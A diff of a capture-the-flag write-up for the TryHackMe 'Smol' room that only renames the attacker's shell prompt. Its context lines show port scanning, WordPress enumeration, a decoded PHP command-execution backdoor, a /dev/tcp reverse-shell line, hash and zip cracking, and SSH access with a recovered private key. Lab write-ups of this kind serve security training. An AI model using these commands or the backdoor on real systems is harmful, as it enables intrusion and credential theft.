@@ -15,7 +15,7 @@ Quick Tips: Do you know that on computers without GPU like the AttackBox, **John
 First we add the room on /etc/hosts file then we use [Rustscan](../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :
 
 ```
-┌──(hax㉿HaxonKali)-[~]
+┌──(mdn0x㉿mdn0xonKali)-[~]
 └─$ rustscan -a smol.thm -- -A 
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
 | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
@@ -28,7 +28,7 @@ ________________________________________
  --------------------------------------
 0day was here ♥
 
-[~] The config file is expected to be at "/home/hax/.rustscan.toml"
+[~] The config file is expected to be at "/home/mdn0x/.rustscan.toml"
 [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
 [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
 Open 10.10.233.122:22
@@ -55,7 +55,7 @@ So we have http server on 80 and ssh on 22 .
 First thing we do is checking if password is allowed on access on [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md) :
 
 ```
-┌──(hax㉿HaxonKali)-[~]
+┌──(mdn0x㉿mdn0xonKali)-[~]
 └─$ ssh root@smol.thm            
 The authenticity of host 'smol.thm (10.10.233.122)' can't be established.
 ED25519 key fingerprint is SHA256:Ndgax/DOZA6JS00F3afY6VbwjVhV2fg5OAMP9TqPAOs.
@@ -73,7 +73,7 @@ Not enabled, it would ask for a password and it don't so we need a **id_key** to
 We search for hidden directories with [Dirsearch](../../3%20-%20Tags/Hacking%20Tools/Dirsearch.md) :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Smol]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Smol]
 └─$ dirsearch -u http://smol.thm
 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
   from pkg_resources import DistributionNotFound, VersionConflict
@@ -83,7 +83,7 @@ We search for hidden directories with [Dirsearch](../../3%20-%20Tags/Hacking%20T
 
 Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
 
-Output File: /home/hax/THM/CHALLENGES/Easy/Smol/reports/http_smol.thm/_25-07-20_21-21-21.txt
+Output File: /home/mdn0x/THM/CHALLENGES/Easy/Smol/reports/http_smol.thm/_25-07-20_21-21-21.txt
 
 Target: http://smol.thm/
 
@@ -124,7 +124,7 @@ There's username [Enumeration](../../3%20-%20Tags/Hacking%20Concepts/Enumeration
 We can use [WPScan](../../3%20-%20Tags/Hacking%20Tools/WPScan.md) which is a [Wordpress](../../3%20-%20Tags/Hacking%20Concepts/Wordpress.md) scanner for vulnerabilities, we can use it without a API token or make a free account on their website to get an API for better results :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Smol]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Smol]
 └─$ wpscan --url http://www.smol.thm                                                    
 _______________________________________________________________
          __          _______   _____
@@ -212,7 +212,7 @@ We can try [Escaping](../../3%20-%20Tags/Hacking%20Concepts/Escaping.md) to the 
 And we have the same code, but we can spot the difference from original project in the eval function in [Base64](../../3%20-%20Tags/Hacking%20Concepts/Base64.md), so we decode it :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Smol]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Smol]
 └─$ echo 'CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=' | base64 -d 
 
  if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }     
@@ -238,7 +238,7 @@ sh -i >& /dev/tcp/10.8.162.183/1337 0>&1
 Now we create the file and open a basic [Python](../../3%20-%20Tags/Programming%20Languages/Python.md) [Server](../../3%20-%20Tags/Hacking%20Concepts/Server.md) :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Smol]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Smol]
 └─$ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
@@ -266,7 +266,7 @@ export TERM=xterm
 www-data@smol:/var$ ^Z
 zsh: suspended  nc -lvnp 1337
                                                                                                                               
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Smol]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Smol]
 └─$ stty raw -echo;fg
 [1]  + continued  nc -lvnp 1337
                                reset
@@ -411,7 +411,7 @@ $P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1
 We can use [Hashcat](../../3%20-%20Tags/Hacking%20Tools/Hashcat.md) to find the passwords :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Smol]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Smol]
 └─$ hashcat hashes.txt /usr/share/wordlists/rockyou.txt 
 hashcat (v6.2.6) starting in autodetect mode
 ```
@@ -422,7 +422,7 @@ Quick Tips: Do you know that on computers without GPU like the AttackBox, **John
 We will use [JohnTheRipper](../../3%20-%20Tags/Hacking%20Tools/JohnTheRipper.md) to gain speed :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Smol]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Smol]
 └─$ john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt  
 Using default input encoding: UTF-8
 Loaded 6 password hashes with 6 different salts (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
@@ -514,10 +514,10 @@ u742mQ/UfeT6NnCJWHTorNpJO1fOexq1kmFKCMncIINnk8ZF1BBRQZtfjMvJ44sj9Oi4aE
 So we have a private key for [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md) . Let's copy it in a file :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Smol]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Smol]
 └─$ nano key       
                                                                                                                               
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Smol]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Smol]
 └─$ cat key 
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
@@ -529,7 +529,7 @@ ehrkrEXjcqmrFvZzp0hnVnbaCyUV8vDrywsrEivK7d5IDefs......................
 We can use the key to access [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md) as `think` user after `chmod 600 key` :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Smol]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Smol]
 └─$ ssh -i key think@smol.thm 
 Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64)
 
@@ -596,7 +596,7 @@ Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/)
 Now we can use [Zip2John](../../3%20-%20Tags/Hacking%20Tools/Zip2John.md) to create the hash and then crack the hash for the zip file with [JohnTheRipper](../../3%20-%20Tags/Hacking%20Tools/JohnTheRipper.md) :
 
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Smol]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Smol]
 └─$ zip2john wordpress.old.zip 
 
 wordpress.old.zip:$pkzip$8*1*1*0*0*24*a31c*c2fb90b3964ce4863c047a66cc23c2468ea4fffe2124c38cb9c91659b31793de138ae891*1*0*0*24*a31c*7722f8032fb202c65e40d0d76a91cdfa948dc7e6857f209a06627320940fa5bcbb2603e6*1*0*0*24*a31c*592448eb70b5198cef005c60d3aeb3d78465376eaa5f465e1c2dd7c890d613102e284c88*1*0*0*24*a320*f87c1c69a82331ca288320268e6c556a6ddc31a03e519747bd7b811b6b837527c82abe0e*1*0*0*24*a320*dc42fd5700a7ab7a3353cc674906dec0d6b997d8d56cc90f1248d684df3382d4d8c3ea45*1*0*0*24*a320*c96021e04f0d8a5ce6f787365277b4c9966e228fe80a3d29bc67d14431ecbab621d9cb77*1*0*0*24*a320*35fe982e604f7d27fedd1406d97fc4e874ea7df806bda1fea74676d3510a698ec6a7a3ac*2*0*26*1a*8c9ae7e6*60ed*6c*0*26*a31c*7106504d46479d273327e56f5e3a9dd835ebf0bf28cc32c4cb9c0f2bb991b7acaaa97c9c3670*$/pkzip$::wordpress.old.zip:wordpress.old/wp-content/plugins/akismet/index.php, wordpress.old/wp-content/index.php, wordpress.old/wp-content/plugins/index.php, wordpress.old/wp-content/themes/index.php, wordpress.old/wp-includes/blocks/spacer/style.min.css, wordpress.old/wp-includes/blocks/spacer/style-rtl.min.css, wordpress.old/wp-includes/blocks/spacer/style.css, wordpress.old/wp-includes/blocks/spacer/style-rtl.css:wordpress.old.zip
@@ -608,7 +608,7 @@ option -o to pick a file at a time.
 
 We copy the hash in a file and crack with [JohnTheRipper](../../3%20-%20Tags/Hacking%20Tools/JohnTheRipper.md) :
 ```
-┌──(hax㉿HaxonKali)-[~/THM/CHALLENGES/Easy/Smol]
+┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Smol]
 └─$ john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt  
 
 Using default input encoding: UTF-8
